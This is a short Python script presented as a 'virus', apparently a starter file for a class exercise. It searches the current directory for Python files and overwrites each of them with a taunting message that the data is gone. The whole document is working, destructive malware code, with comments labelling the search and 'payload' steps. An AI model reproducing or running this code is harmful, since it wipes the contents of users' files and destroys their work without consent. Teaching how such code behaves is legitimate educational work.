import os

# Searching portion of the virus.
def search(path):
    # Set up an empty list which will contain our target files. 
    filesToInfect = []
    fileList = os.listdir(path)
    for fileName in fileList:
        # Check the current directory for any python files. 
        if fileName[-3:] == ".py":
            # Add any found into the filesToInfect list.
            filesToInfect.append(fileName)
    # Remove the virus from the list.
    filesToInfect.remove('Virus in Python - STARTER.py')
    # Informs the user of the files that have been found.
    for i in range(len(filesToInfect)):
        print ("Target found -", filesToInfect[i])
    # Returns the filesToInfect list so it can be used in another function.
    return filesToInfect    

# This is the payload function
def infect(filesToInfect):
    for fileName in filesToInfect:
        # Open up each file in turn and prepare it for writing over.
        f = open(fileName, 'w')
        # Replace the contects of the file with this line.
        f.write ("All your data has gone. You should have done a backup")
        # Close the file up.
        f.close()
# Runs the searching part then the infecting part back to back. 
filesToInfect = search(os.path.abspath(""))
infect(filesToInfect)


















